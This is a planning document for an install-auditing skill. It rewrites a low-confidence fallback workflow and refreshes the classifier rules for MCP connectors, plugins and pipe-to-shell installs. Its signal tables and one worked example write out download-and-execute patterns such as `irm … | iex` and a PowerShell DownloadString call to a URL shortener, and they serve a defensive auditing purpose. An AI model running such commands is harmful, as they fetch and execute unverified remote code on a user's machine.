# Generic Fallback + Classifier Refresh

> **Status:** Ready
> **Author:** Claude (Opus)
> **Parent:** 2610161927-remote-integration-generic-stewardship-review-eval.md
> **Source:** 2610161927-remote-integration-generic-stewardship-review-eval.md (G-1, G-2 subject part, G-3, G-4 alignment, G-5 minor, RI-8) | 2610161927-agent-extension-stewardship-review-eval.md (F13, F14 classifier part) | hand-off row "remote-integration + generic" of 2610161941-shared-version-integrity-floor-plan.md
> **Related Projex:** 2610161941-shared-version-integrity-floor-plan.md | 2610161941-shared-version-integrity-floor-walkthrough.md | 2604170930-trim-generic-md-m52-walkthrough.md | 2604160430-tighten-classifier-m51-walkthrough.md | 2610161927-agent-extension-stewardship-review-eval.md | 2610161927-remote-integration-generic-stewardship-review-eval.md | 2604070218-install-auditor-subject-typed-redesign-nav.md | siblings: 2610162007-agent-extension-rubric-refresh-plan.md | 2610162007-remote-integration-rubric-refresh-plan.md | 2610162006-cli-binary-rubric-refresh-plan.md
> **Worktree:** Yes

---

## Summary

Refits the low-confidence fallback to the subjects that actually reach it (scripts, portals, certificates, multi-component repos), pins its report shape and confidence cap, and refreshes the classifier. The classifier work adds PowerShell pipe-to-shell signals, routes hosted MCP / AI-assistant connectors to agent-extension 8a and npm-sourced marketplace plugins to 8b, and refreshes stale Type 8 signals. `SKILL.md` changes only 4 signal-table rows, net −2 B.

**Scope:** `workflows/generic.md` (full rewrite) | `references/classifier.md` (8 exact edits) | `SKILL.md` Step 0 signal table rows 7, 8, 9, 0 only. No evals, no other workflows or addenda.
**Estimated Changes:** 3 files; 1 full-file replacement, 12 exact string replacements.

---

## Objective

### Problem / Gap / Need

| ID | Gap (verified on base `20843cc`) | Fix here |
|---|---|---|
| G-1 | `generic.md` Phase 3: 3 of 4 checks assume a package (CVE by name+version, maintainer count, typosquat). All 3 generic evals are non-package (33 portal + certificate, 34 PowerShell one-liner, 35 monorepo `make install`). No check for what executes or what trust is granted. No source-provenance check. | Phase 3 gets two subject checks: **Execution & trust grant** and **Source provenance**. Canonical rows get generic handling. Ratings move to `Toward REJECTED / CONDITIONAL / APPROVED` notes, which `SKILL.md` Tree terms ("CRITICAL flag … routed workflow's … `Toward REJECTED` notes") already consume |
| G-2 (subject part) | `generic.md` has no tier, so it is unclear whether the Quick skeleton or the full template applies. The shared plan sanctioned workflow-defined skips "within its confidence cap" (`SKILL.md` L130; `criteria.md` L60) but left the cap and shape to this plan | Shape: Quick skeleton by default; full template once any HIGH/CRITICAL fires. Cap: Audit confidence ≤ Moderate. `Skipped (generic fallback)` rows are by-design skips |
| G-3 | No PowerShell pipe-to-shell signal (`irm … \| iex`, `iex (… DownloadString …)`) in `SKILL.md` row 7 or `classifier.md` row 7. Eval 34's route needs a decision | Add signals. **Decision:** pipe-to-shell behind an opaque URL → cli-binary, **medium** (routing override + worked example 8). Eval 34 re-expectation → eval plan (Hand-off) |
| G-4 | Done by the shared plan: `SKILL.md` L67 "(sole exception: `workflows/generic.md` Phase 2)" and `classifier.md` L121–123 "Sole exception". `generic.md` Phase 2 itself does not say it is the sole exception or when the window closes | Phase 2 names itself the only re-route and limits it to before Phase 3 starts; a late answer → finish + recommend re-audit |
| G-5 (minor) | Unanswered clarification question is lost in non-interactive runs | Phase 4 records the question + candidates in Recommendation |
| RI-8 / F13(b) | Remote MCP / AI-assistant connector (no local code, OAuth) fires Type 8 ("MCP") and Type 9 ("OAuth … no local code") with no override → misroute or generic | **Decision:** connector that adds tools the assistant calls → agent-extension 8a, borrowing remote-integration's OAuth/data sub-step. SaaS/AI app that only gets data access, no tools for the user's agent → remote-integration. Override rows + worked example 7 + row 8/9 signal wording |
| F13(a) | Override "Claude Code skill or plugin distributed via npm → registry-package" (`classifier.md` L65) also captures `/plugin install x@mkt` whose marketplace entry has `source: npm` | Narrow to "installed with `npm install`"; new override + worked example 6 → agent-extension 8b |
| F13(c) / F14 | Stale Type 8 signals: "MCP manifest" (MCP has no static manifest), `claude-code/plugins/*`, host list "Cursor, Cline, Continue" | Rows 8 (`SKILL.md` + `classifier.md`) and 8a/8b/8c definitions refreshed |

### Success Criteria

- [ ] `workflows/generic.md` equals the Step 3 replacement text exactly (`diff` empty), is ≤ 160 lines, and contains: `**Execution & trust grant**`, `**Source provenance**`, `Skipped (generic fallback)`, `**Moderate** at most`, `Quick (generic fallback)`, `Standard (generic fallback)`, `### Toward REJECTED`, `### Toward CONDITIONAL`, `### Toward APPROVED`, `If the user clarifies before Phase 3 starts`.
- [ ] `generic.md` keeps the Phase 4 literal `**Classification confidence:** Low — generic fallback` and the four `## Phase N` headers.
- [ ] `references/classifier.md`: all 8 After strings present once. `claude-code/plugins/*`, `distributed via npm`, `MCP server manifest` absent. "Sole exception" line from the shared plan intact. Worked examples numbered 1–8.
- [ ] `SKILL.md`: 4 row After strings present once; `MCP manifest` absent; `wc -c < SKILL.md` ≤ 15,500 and ≤ the Preflight value (expected 15,484 → 15,482).
- [ ] Nothing outside the 3 files changes (`git diff --stat` = 3 files); `evals/` untouched; harness green (`validate`, both unittest suites at Preflight counts).
- [ ] Paper traces T1–T9 (Verification Plan) reach the stated route and verdict.

### Out of Scope

- `evals/evals.json`: eval 34 re-expectation, the generic case count, new routing cases → eval plan (Hand-off).
- `workflows/cli-binary.md`, `workflows/agent-extension.md`, `workflows/remote-integration.md` and their addenda. Their planners receive routing requirements (Hand-off), and this plan does not edit them.
- `SKILL.md` outside the Step 0 signal-table rows: confidence table, output shape, Dispatch Table, Reference Files line, verdict tree, Tree terms, Red Flags, Report. The generic Reference Files description stays accurate.
- `references/criteria.md` (the skip contract is already in L60), `references/report-template.md`, `STEWARDSHIP.md`, the taxonomy definition.
- Type 1–7 signal rows other than 7. Their refresh is sibling-plan territory if needed.

---

## Context

### Current State

- Base `claude/youthful-dijkstra-5ov1kt` @ `20843cc`. The shared plan 2610161941 squash-closed: `SKILL.md` 15,484 B; Step 0 L67 carve-out; Tree terms → Blocking CVE + §4.6 precedence; confidence High accepts `Skipped` "(`Skipped (Tier N)` or a workflow-defined reason, within its confidence cap)" (L130). `references/criteria.md` L60: "A workflow may define its own `Skipped (<reason>)` values and cap Audit confidence for them". Rows table L39–52: Required at all tiers = Registry/metadata, Typosquat/name, CVE/advisories, Version integrity (§4.6), License.
- `workflows/generic.md` (80 lines, 3,621 B, last touched `a8e62a7`): 4 phases. Phase 3 = 4-row package-shaped table + "Skip:" line + `Skipped (generic fallback)`; Phase 4 stamps header + Recommendation; Subject Verdict Notes "No subject-specific verdict overrides".
- `references/classifier.md` (123 lines, 9,249 B): Type 8 Sub-Rubric L49–56; Routing Overrides L58–74 (L65 npm row); Extended Signal Patterns L76–91 (rows 7, 8, 9 = L88–90); Worked Hybrid Examples L93–109 (5 examples); Edge-Case Discipline L111–123.
- `SKILL.md` Step 0 signal table L43–54: rows 7 (179 B), 8 (128 B), 9 (105 B), 0 (99 B).
- Routing destinations exist: `workflows/cli-binary.md` has an install-script review (L133 "Download the script (do NOT pipe to shell). Read it.") and Toward REJECTED "Install script (`curl | sudo sh`) from unknown or unverifiable source" (L236). `workflows/agent-extension.md` handles remote HTTP/SSE transport (L152–155) but not OAuth grants. `workflows/remote-integration.md` never mentions MCP.
- Grader: `evals/run_evals.py` `routing_match` compares the parsed `Routes to:` with each eval's `workflow` field; `MIN_CASES_PER_WORKFLOW = 3` (generic has exactly 3).

### Key Files

| File | Role | Change Summary |
|------|------|----------------|
| `references/classifier.md` | Full classifier rule (read when Step 0 doesn't resolve cleanly) | 8a/8b/8c definitions; 1 override narrowed + 5 added; signal rows 7/8/9; worked example 5 reworded + 6–8 added |
| `SKILL.md` | Dispatcher; Step 0 signal summary | Rows 7, 8, 9, 0 reworded; net −2 B |
| `workflows/generic.md` | Low-confidence fallback | Full rewrite: execution/trust + provenance checks, canonical-row handling, shape + confidence cap, re-route window, verdict notes |

### Dependencies

- **Requires:** 2610161941-shared-version-integrity-floor-plan.md closed onto base (✓ `20843cc` at planning; Preflight re-checks). Its outputs this plan uses: `SKILL.md` L130 skip wording, `criteria.md` L60 skip contract, `classifier.md` "Sole exception" bullet, §4.6 + `Version integrity` row.
- **Concurrent (sibling refresh plans, this session):** agent-extension, remote-integration, cli-binary and the others. By orchestrator rule they do not edit `references/classifier.md` or `workflows/generic.md`. Some may edit other `SKILL.md` regions. This plan's `SKILL.md` delta is −2 B, so it never consumes their headroom; Step 2 re-anchors per row if a sibling landed first.
- **Blocks:** eval plan (eval 34 route, generic case count, new routing cases); agent-extension and remote-integration workflow text that must match the RI-8 decision (Hand-off).

### Constraints

- `SKILL.md` ≤ 15,500 B and must not grow (shared-plan Risk: "Later plans adding to `SKILL.md` must offset or justify their own budget").
- Edit only the signal-table rows of `SKILL.md` (orchestrator brief). Detail goes to `references/classifier.md`.
- Classification stays read-only; evidence acquisition starts inside the routed workflow (`classifier.md` Edge-Case Discipline). Phase 3 may fetch to read, never execute.
- Style: `workflows/*.md` and `classifier.md` prose wraps at ~78 columns; tables are single long lines; `SKILL.md` uses long lines.
- Shipped files carry no projex filenames.

### Assumptions

- **A1:** The shared-plan text quoted in Current State is on base unchanged (Preflight greps).
- **A2:** No sibling plan has edited `classifier.md` or `generic.md` by execution time (Preflight `git log` check). If one has, re-anchor the affected edits and don't overwrite their text.
- **A3:** Claude Code marketplace entries can use `source: npm`, and Claude Code fetches the package itself (agent-extension eval E9, vendor doc, not re-fetched here). The shipped wording only says "the marketplace entry picks the source and Claude Code fetches it". It does not claim install scripts are disabled.
- **A4:** `claude mcp add --transport http`, `/plugin install`, `claude plugin install`, `/plugin marketplace add`, `.mcpb` / `.dxt`, `registry.modelcontextprotocol.io` and `npx skills add` / `skills.sh` are current names (agent-extension eval 5.3/5.4/5.9, Medium–High). They are signals only; a wrong name causes a weaker match, never a wrong rubric.
- **A5:** Eval assertions for 33/35 stay satisfiable under the new generic text (T6, T7). Eval 34 deliberately changes route (T5, Hand-off).

### Impact Analysis

- **Direct:** the 3 files.
- **Adjacent:**
  - Remote-MCP subjects now land in `workflows/agent-extension.md`. Until that plan adds OAuth handling, the 8a audit relies on the override's "sub-step borrowed from `workflows/remote-integration.md`" instruction.
  - `/plugin install` subjects with npm sources move from registry-package to agent-extension 8b.
  - PowerShell one-liners move from generic to cli-binary.
- **Downstream:**
  - Eval 34's `routing_match` flips to false until the eval plan updates its `workflow` field.
  - Removing eval 34 from generic leaves generic with 2 cases, so `validate` will fail unless the eval plan adds one in the same change.
  - Live audits of portal/certificate/script subjects get longer reports (full template when HIGH fires).

---

## Implementation

### Overview

Preflight → classifier rules (Step 1, source of truth) → `SKILL.md` row summary (Step 2) → `generic.md` rewrite (Step 3). Steps 1–3 are independent in content. Do them in this order so the summary follows the rule. Every edit is an exact `old → new` pair, simulated at planning against `20843cc` (all matched once). Use the Edit tool per pair. If one misses, re-read that region and re-anchor; don't improvise wording.

**Preflight (`<work-root>` = worktree):**

```bash
ls .projex/closed/2610161941-shared-version-integrity-floor-walkthrough.md        # exists
git branch --list "projex/2610161941*"                                             # empty
grep -c "workflows/generic.md\` Phase 2" SKILL.md references/classifier.md        # 1 and 1
grep -c "Sole exception" references/classifier.md                                  # 1
grep -c "workflow-defined reason, within its confidence cap" SKILL.md              # 1
grep -c "A workflow may define its own \`Skipped (<reason>)\` values" references/criteria.md   # 1
git log --oneline 20843cc..HEAD -- references/classifier.md workflows/generic.md SKILL.md   # record; non-empty → A2 re-anchor
wc -c < SKILL.md                                                                   # record as S0 (expect 15484)
python3 evals/run_evals.py validate | head -1                                      # record
python3 -m unittest discover -s evals -p "test_*.py" 2>&1 | tail -1                # record
python3 -m unittest discover -s tests 2>&1 | tail -1                               # record
```

Stop rule: if the walkthrough is missing or any `grep -c` returns 0, the shared contract hasn't landed. Set this plan `Blocked` and report. Don't recreate the shared text here.

---

### Step 1: Refresh `references/classifier.md`

**Objective:** encode the RI-8, F13 and G-3 routing rules and refresh the Type 8 and pipe-to-shell signals.
**Confidence:** High (G-3, F13a/c); Medium-High (RI-8 decision; see Notes → Decisions)
**Depends on:** Preflight
**Verify-Projex:** Encouraged (routing decisions shape every later audit of these subjects)

**Files:** `references/classifier.md`

**Changes:** 8 exact replacements (C1–C8). Result ≈ 150 lines / 12,904 B (simulated).

````markdown
// C1 Before (Type 8 Sub-Rubric):
- **8a · MCP server** — standalone process / binary / script advertising MCP
  tools, referenced from an MCP config (`.mcp.json`, Claude Desktop config)
- **8b · Claude Code plugin** — plugin bundle (`plugin.json` + commands /
  hooks / agents) distributed for Claude Code
- **8c · Claude Code skill** — directory containing `SKILL.md` (plus optional
  `scripts/`, `references/`, `evals/`)
// C1 After:
- **8a · MCP server** — process / binary / script advertising MCP tools,
  referenced from an MCP config (`.mcp.json`, Claude Desktop config,
  `claude mcp add`) or shipped as an `.mcpb` / `.dxt` bundle; **or** a remote
  MCP endpoint the agent host connects to by URL (Streamable HTTP, legacy
  SSE), incl. AI-assistant "custom connectors" — no local code
- **8b · Claude Code plugin** — plugin (`.claude-plugin/plugin.json`;
  commands, skills, agents, hooks, MCP / LSP servers, `bin/`) installed with
  `/plugin install` / `claude plugin install` from a marketplace
  (`.claude-plugin/marketplace.json`) or loaded from a local directory
- **8c · Claude Code skill** — directory containing `SKILL.md` (plus optional
  `scripts/`, `references/`, `evals/`); the Agent Skills format, also loaded
  by other agent hosts

// C2 Before (Routing Overrides):
| Claude Code skill or plugin distributed via npm | registry-package | `npm install` is the gate; skill content is reviewed inside the registry-package audit |
// C2 After:
| Claude Code skill or plugin installed with `npm install` | registry-package | `npm install` is the gate; skill content is reviewed inside the registry-package audit |

// C3 Before (Routing Overrides):
| Claude Code plugin or skill installed directly | agent-extension | Distinct boundary from IDE marketplaces |
// C3 After:
| Claude Code plugin or skill installed directly | agent-extension | Distinct boundary from IDE marketplaces |
| Claude Code plugin from a marketplace whose entry has `source: npm` (or any other source type) | agent-extension (8b) | `/plugin install` is the gate: the marketplace entry picks the source and Claude Code fetches it; npm is transport, not the boundary the user crosses |
| Remote MCP server or AI-assistant connector that adds tools the assistant calls (custom connector by URL, connector directory entry, `claude mcp add --transport http`) | agent-extension (8a) | The agent host's MCP connection is the innermost gate: tool descriptions enter the model's context and tools act for the user. Audit any OAuth grant and the operator's data handling as a sub-step borrowed from `workflows/remote-integration.md` |
| SaaS or AI app that gets OAuth / API-key access to your data and exposes no tools to your agent (incl. "AI over your Slack / Drive" apps) | remote-integration | The consent grant is the gate; AI sub-processing and data use are rated there |

// C4 Before (Routing Overrides, last row):
| SaaS that also installs a local agent | The component this request installs or connects | Classify one primary boundary; name the other component in the report and recommend a separate audit (one report per installable) |
// C4 After:
| SaaS that also installs a local agent | The component this request installs or connects | Classify one primary boundary; name the other component in the report and recommend a separate audit (one report per installable) |
| Pipe-to-shell (`curl … \| sh`, `irm … \| iex`) whose URL hides the publisher (shortener, paste site, raw IP) | cli-binary, **medium** | The pipe-to-shell is the install pipe; the unknown payload is residual uncertainty that the workflow's install-script review handles (download, read, never pipe) |
| Web portal, bookmark or certificate prompt with no installable artifact named | generic, **low** | No type covers trust-store or certificate changes; `workflows/generic.md` Phase 3 rates the trust grant |

// C5 Before (Extended Signal Patterns):
| 7 | cli-binary | `curl … \| sh`, `wget … \| bash`, GitHub Releases binary, `brew install <formula>` (Homebrew core), version managers (nvm / pyenv / rustup / volta), direct executable URL, checksum / signature file beside a binary | `github.com/*/releases/download/*`, `formulae.brew.sh/formula/*`, `get.<vendor>.sh`-style install scripts, vendor-hosted binary URLs |
// C5 After:
| 7 | cli-binary | `curl … \| sh`, `wget … \| bash`, `sh -c "$(curl …)"`, `bash <(curl …)`; PowerShell `irm … \| iex`, `iwr … \| iex`, `iex (irm …)`, `Invoke-Expression` over `(New-Object Net.WebClient).DownloadString(…)`; GitHub Releases binary, `brew install <formula>` (Homebrew core), version managers (nvm / pyenv / rustup / volta), direct executable URL, checksum / signature file beside a binary | `github.com/*/releases/download/*`, `formulae.brew.sh/formula/*`, `get.<vendor>.sh`-style install scripts, `*.ps1` install-script URLs, vendor-hosted binary URLs |

// C6 Before:
| 8 | agent-extension | MCP server manifest / stdio spec; Claude Code plugin bundle; Claude Code skill with `SKILL.md`; agent host context (Cursor, Cline, Continue) | `.mcp.json` entries, `.claude/skills/*`, `claude-code/plugins/*`, `modelcontextprotocol.io/*`, `mcp.so/*` |
// C6 After:
| 8 | agent-extension | MCP server config / stdio command, `claude mcp add`, remote MCP URL (Streamable HTTP / SSE) or AI-assistant custom connector, `.mcpb` / `.dxt` bundle; Claude Code plugin (`.claude-plugin/plugin.json`), `/plugin install`, `claude plugin install`, `/plugin marketplace add`; skill with `SKILL.md`, `npx skills add`; agent host context (Claude Code / Desktop, Cursor, Codex, VS Code agent mode, other MCP or Agent Skills hosts) | `.mcp.json` entries, `.claude-plugin/marketplace.json`, `.claude/skills/*`, `registry.modelcontextprotocol.io/*`, `modelcontextprotocol.io/*`, `mcp.so/*`, `skills.sh/*` |

// C7 Before:
| 9 | remote-integration | OAuth flow, API key exchange, webhook endpoint, "Connect to <service>", no local code install | Vendor OAuth URLs, `hooks.slack.com/*`, vendor integrations pages, `api.*.com/*` key-exchange endpoints |
// C7 After:
| 9 | remote-integration | OAuth flow, API key or service-account key exchange, webhook endpoint, "Connect to <service>"; no local code install and no MCP tools exposed to the user's agent | Vendor OAuth URLs, `hooks.slack.com/*`, vendor integrations / marketplace pages, `api.*.com/*` key-exchange endpoints |

// C8 Before (Worked Hybrid Examples, item 5):
5. **Claude Code skill distributed via npm** → **registry-package**, high. If the
   skill content is the main concern, the registry-package audit may apply
   agent-extension 8c signals as a sub-rubric.
// C8 After:
5. **Claude Code skill installed with `npm install`** → **registry-package**,
   high. If the skill content is the main concern, the registry-package audit
   may apply agent-extension 8c signals as a sub-rubric.
6. **Claude Code plugin from a marketplace entry with `source: npm`**
   (`/plugin install x@mkt`) → **agent-extension** (8b), high. The user
   crosses the marketplace + `/plugin install` gate; npm is only how Claude
   Code fetches the files. Contrast example 5, where `npm install` is the gate.
7. **Remote MCP connector added to an AI assistant by URL, with OAuth
   sign-in** → **agent-extension** (8a), high. No local code; the host loads
   the server's tools into the model's context. The 8a audit covers the tool
   surface and transport; OAuth scopes and the operator's data handling are a
   sub-step borrowed from `workflows/remote-integration.md`. A SaaS app that
   only gets OAuth access to your data, with no tools for your agent, stays
   **remote-integration**.
8. **PowerShell one-liner behind a URL shortener**
   (`iex ((New-Object Net.WebClient).DownloadString('http://bit.ly/…'))`) →
   **cli-binary**, medium. Pipe-to-shell is the install pipe even when the
   payload is unknown; `workflows/cli-binary.md` rates an unverifiable install
   script toward REJECTED.
````

(`\|` inside table cells is the file's existing escape for a literal pipe; keep it. `…` is U+2026, `→` U+2192, `—` U+2014, as in the file.)

**Rationale:**
- **C3/C7 + example 7 (RI-8).** Innermost boundary = the last gate before something acts for the user. For a tool-bearing connector, that gate is the host's MCP connection: descriptions enter the model's context and the model calls tools. The novel risks are tool poisoning, rug pull and lethal-trifecta combinations (agent-extension eval F5), and only agent-extension can rate them. The OAuth grant is a bounded, borrowable sub-step, and "may borrow a sibling workflow's sub-steps without re-routing" is already Edge-Case Discipline. The rejected alternative (remote-integration + 8a sub-step) would leave remote-integration's rubric scoring the tool surface, which it has no model for. The "no tools for your agent" test keeps OAuth-only SaaS/AI apps (RI-7's "AI over your Slack") in remote-integration.
- **C2/C3 + example 6 (F13a).** `npm install` stays registry-package (eval 40 unchanged). `/plugin install` is a different gate even when the bytes come from npm.
- **C4 + example 8 (G-3).** `curl … | sh` to an arbitrary host already routes cli-binary. Sending the PowerShell equivalent to generic only because the URL is a shortener would be inconsistent. The unknown payload is exactly the residual uncertainty that `SKILL.md` says medium-confidence workflows absorb, and cli-binary L236 rejects unverifiable install scripts. Rejected alternative: keep eval 34 generic with a "shortener → low" rule. That would add a URL-shape exception to a boundary rule and leave curl/PowerShell asymmetric.
- **C4 portal row.** Documents why eval 33's shape belongs in generic: no type owns trust-store changes, and generic Phase 3 now rates them.
- **C1/C6 (F13c, F14).** Removes "manifest" (MCP tools are runtime `tools/list`), `claude-code/plugins/*` and the stale host list. Wording is classification-level only; risk modelling stays with the agent-extension plan.

**Verification:**
```bash
grep -c "claude-code/plugins\|distributed via npm\|MCP server manifest" references/classifier.md   # 0
grep -c "agent-extension (8a)\|agent-extension (8b)\|cli-binary, \*\*medium\*\*\|generic, \*\*low\*\*" references/classifier.md   # 4 (rows C3×2, C4×2)
grep -c "^[1-8]\. \*\*" references/classifier.md      # 8
grep -c "irm … \\\\| iex" references/classifier.md     # 2 (C4, C5)
grep -c "Sole exception" references/classifier.md      # 1 (shared plan line intact)
awk 'length($0)>80 && $0 !~ /^\|/' references/classifier.md | wc -l   # 2 (pre-existing example lines 1 and 3)
```

**If this fails:** `git -C <work-root> checkout -- references/classifier.md`, re-read the missed region, re-anchor that pair only.

---

### Step 2: Refresh `SKILL.md` Step 0 signal-table rows 7, 8, 9, 0

**Objective:** surface the PowerShell signal and the 8a/9 tie-break in the summary table so a remote MCP URL resolves at Step 0 without reading `classifier.md`. Net bytes ≤ 0.
**Confidence:** High
**Depends on:** Step 1 (summary mirrors the rule)
**Do-Projex:** Encouraged

**Files:** `SKILL.md`

**Changes:** 4 exact replacements (simulated per row S1–S4: −13, +8, +6, −3 B → net −2 B; 15,484 → 15,482).

```markdown
// S1 Before:
| 7 | cli-binary | `curl … \| sh`, GitHub Releases binary, `brew install <formula>` (Homebrew core; `--cask` → desktop-app), nvm/pyenv/rustup, vendor-hosted executable URLs |
// S1 After:
| 7 | cli-binary | `curl … \| sh`, `irm … \| iex`, GitHub Releases binary, `brew install <formula>` (not `--cask`), nvm/pyenv/rustup, vendor-hosted executables |

// S2 Before:
| 8 | agent-extension | MCP manifest (**8a**), Claude Code plugin bundle (**8b**), Claude Code skill with `SKILL.md` (**8c**) |
// S2 After:
| 8 | agent-extension | MCP config or server URL (**8a**), Claude Code plugin / `/plugin install` (**8b**), `SKILL.md` skill (**8c**) |

// S3 Before:
| 9 | remote-integration | OAuth flow, API key exchange, "Connect to <service>", no local code install |
// S3 After:
| 9 | remote-integration | OAuth flow, API key exchange, "Connect to <service>"; no local code or MCP server |

// S4 Before:
| 0 | generic | no strong signals fire, or conflict unresolved after the innermost-boundary rule |
// S4 After:
| 0 | generic | no strong signal fires, or conflict unresolved by the innermost-boundary rule |
```

**Rationale:**
- S2 + S3 make a remote MCP URL a strong Type 8 match and exclude it from Type 9, so the tie-break happens in the table itself.
- S1 keeps the cask pointer as "(not `--cask`)": row 6 lists `brew install --cask` and `classifier.md` keeps the full cask override.
- S4 is a pure trim that funds S2/S3.
- Rejected alternative: a new Step 0 sentence for remote MCP. It costs ~120 B that the budget doesn't have, and it repeats `classifier.md`.

**Verification:**
```bash
wc -c < SKILL.md                                    # ≤ 15500 and ≤ S0 (expect 15482)
grep -c "MCP manifest\|executable URLs" SKILL.md    # 0
grep -c "irm … \\\\| iex" SKILL.md                  # 1
grep -c "no local code or MCP server" SKILL.md      # 1
python3 -c "import re;t=open('SKILL.md',encoding='utf-8').read();print(len(re.findall(r'^\| [0-9] \| [a-z-]+ \|',t,re.M)))"   # 20 (10 signal + 10 dispatch rows, unchanged)
```

**If this fails:** `git -C <work-root> checkout -- SKILL.md`. If a sibling plan has changed a row's text, apply that row's intent to the new text with the same or smaller byte count, and log it. Never let `SKILL.md` grow.

---

### Step 3: Rewrite `workflows/generic.md`

**Objective:** G-1 (subject checks + canonical rows), G-2 subject part (shape + Moderate cap), G-4 alignment (sole re-route, window), G-5 (record the unanswered question), verdict notes the tree can consume.
**Confidence:** High (structure); Medium (rating thresholds are policy, see Risks)
**Depends on:** Preflight (skip contract + carve-out on base)
**Verify-Projex:** Encouraged

**Files:** `workflows/generic.md`

**Changes:** replace the whole file (80 lines) with exactly this text (151 lines, ~7,970 B; verified at planning):

````markdown
<!-- workflows/generic.md - Low-confidence fallback. Routes here only when Step 0
classifier produces LOW confidence (conflicting signals or no signals). Every
resolved subject type has its own specific workflow (Types 1-9). -->

# Generic Fallback Workflow (Low-Confidence Only)

> **WARNING — Low-confidence classification.** The dispatcher could not
> confidently identify the subject type. This workflow attempts to resolve the
> ambiguity; if it cannot, it runs a defensive minimum audit sized for the
> subjects that land here (scripts, portals, certificates, multi-component
> repos, not only packages). Reports produced here carry a low-confidence
> warning.

After completing all sections below, return to `SKILL.md` Step N for the
shared verdict tree and audit-coverage report shape.

---

## Phase 1 — Subject Probe

Examine available signals (read-only):

1. **Read the classifier output** — the `Rationale` field names which signals
   fired and which types were candidates. Record the top 1-2 candidates.
2. **Inspect the install artifact** — URL, command, manifest, or file extension.
   A signal the classifier missed goes into the Phase 2 question; it never
   re-routes on its own.
3. **Check the user's stated purpose** — often reveals the subject type even
   when technical signals are ambiguous.
4. **Name what the install action does** — runs code, grants trust or access,
   or only stores a link. Phase 3 starts from this.

---

## Phase 2 — User Clarification

Present findings from Phase 1 and ask the user to resolve the ambiguity:

> "The classifier could not confidently determine the subject type. Based on
> available signals, the best candidates are **[candidate 1]** and
> **[candidate 2]**. Can you confirm which type this is, or provide additional
> context (e.g., where you found it, what it does, how it installs)?"

**If the user clarifies before Phase 3 starts** → re-route. This is the only
re-route allowed after Step 0 (`SKILL.md` Step 0; `references/classifier.md`
Edge-Case Discipline):
- Update the classifier output to reflect the user-confirmed type
- Set confidence to `high` with `user override: <verbatim>` in Rationale
- Route to `workflows/<confirmed-type>.md` and restart the audit there
- **Do not continue in this file**

**If the user cannot clarify** (or context is non-interactive) → proceed to
Phase 3 and keep the question for the report (Phase 4). A clarification that
arrives after Phase 3 starts does not re-route: finish here and recommend a
re-audit under the confirmed type.

---

## Phase 3 — Defensive Minimum Audit

Run a reduced checklist: enough signal for the verdict tree, nothing more.
Gather evidence without executing anything: resolve redirects and download
scripts or manifests to read them; never run them.

**Subject checks** (run first; they decide most generic verdicts):

| Check | What to do |
|-------|------------|
| **Execution & trust grant** | List what the install action executes or grants: code run without review (pipe-to-shell, `iex`, `make install`, setup scripts); privilege elevation (sudo, admin, UAC); trust-store change (root CA, certificate install, configuration / MDM profile, proxy settings); persistence (services, scheduled tasks, login items, shell profile edits); network exposure (listeners, tunnels, remote access); credential or data grant (OAuth, API keys, tokens). Rate each item per Subject Verdict Notes |
| **Source provenance** | Where the subject came from: URL shortener or redirector, plain HTTP, raw IP or paste site, lookalike or newly registered domain, unsolicited forum / chat / email origin, link not on the publisher's own domain. Rate per Subject Verdict Notes |

Where a candidate type's workflow covers one component (e.g. the
install-script review in `workflows/cli-binary.md` for a Makefile target or
setup script), run that review as a sub-step without re-routing.

**Canonical rows** (`references/criteria.md` rows table). Never drop a
Required row; use `N/A (<reason>)` when it cannot apply:

| Row | Generic handling |
|-----|------------------|
| Registry / metadata lookup | Registry, store or release page exists → look it up; else `N/A (no registry)` |
| Typosquat / name verification | Name, publisher and domain vs plausible legitimate ones, incl. lookalike domains |
| CVE / advisories | Named, versioned artifact → OSV, GHSA, NVD; artifact exists but unidentifiable → `Not available (<why>)`; no artifact → `N/A (no versioned artifact)`. Always search incidents for the publisher or domain |
| Version integrity | `references/criteria.md` §4.6 for a versioned artifact; same `Not available` / `N/A` split as the CVE row |
| License compatibility | When code is distributed; else `N/A (no distributed code)` |
| Maintainer / activity / health | Brief: last release or commit, maintainer count; flag abandoned (>24 months) or single anonymous maintainer |
| Permissions / least privilege | If applicable: requested access vs stated purpose |
| OpenSSF Scorecard; Dependency tree / transitive risk; Source code review (behavioral) | `Skipped (generic fallback)` |

Also skip tier triage, deep rubric scoring and alternatives comparison; they
belong in specific workflows.

**Report shape and confidence:**

- **Shape:** Quick skeleton from `SKILL.md`, with
  `**Audit tier:** Quick (generic fallback)`. If any check raises a HIGH or
  CRITICAL flag, use the full `references/report-template.md` skeleton with
  `**Audit tier:** Standard (generic fallback)` instead.
- **Confidence cap:** Audit confidence is **Moderate** at most, because the
  subject type (and so the right rubric) is unconfirmed; say so in the
  confidence reason. `Skipped (generic fallback)` rows are by-design skips:
  they do not count as **Not available** and do not lower the rating
  further. Rate lower per `SKILL.md` when other gaps apply.

---

## Phase 4 — Low-Confidence Warning

Stamp the following in the report:

- **Report header:** add `**Classification confidence:** Low — generic fallback` below the Subject type line
- **Recommendation section:** prepend: *"This audit used the generic fallback
  workflow (low classification confidence). Coverage is reduced. Consider
  re-running with an explicit subject type for full coverage."* If Phase 2
  went unanswered, add its question and the candidate types so a reviewer can
  re-route.

---

## Subject Verdict Notes

These ratings feed the `SKILL.md` Step N tree like any workflow's notes.

### Toward REJECTED

- Code that executes unread **and** comes from a source with any provenance
  smell, or from no identifiable publisher (e.g. pipe-to-shell behind a URL
  shortener) — CRITICAL. Recommend obtaining the tool from its publisher's
  own channel and auditing that instead.
- Root CA or trust-store addition from an unknown or unsolicited issuer —
  CRITICAL: the holder can intercept all TLS traffic.

### Toward CONDITIONAL

- Code that executes but can be read first (script, Makefile target) and was
  not reviewed by report time — HIGH. Condition: review it, then re-audit.
- Root CA or trust-store addition from a claimed internal or vendor issuer
  not yet confirmed — HIGH. Condition: check the fingerprint with the issuer
  out of band, or install through managed device policy.
- One-site certificate exception — MEDIUM. Condition: ask the operator for a
  certificate from a publicly trusted or org-managed CA.
- Privilege elevation, persistence or network exposure that the stated
  purpose does not explain — HIGH; explained → MEDIUM.
- Credential or data grant — rate scope against stated purpose with the
  `workflows/remote-integration.md` scope checks (sub-step, no re-route).
- Each provenance smell — MEDIUM; HIGH when the delivered content executes.

### Toward APPROVED

- Nothing executes and no trust is granted (e.g. a bookmark), or every item
  above is explained, confirmed with its issuer, and low-impact.
````

The file ends with a single trailing newline after the last line. The outer 4-backtick fence is not part of the file.

**Rationale:**
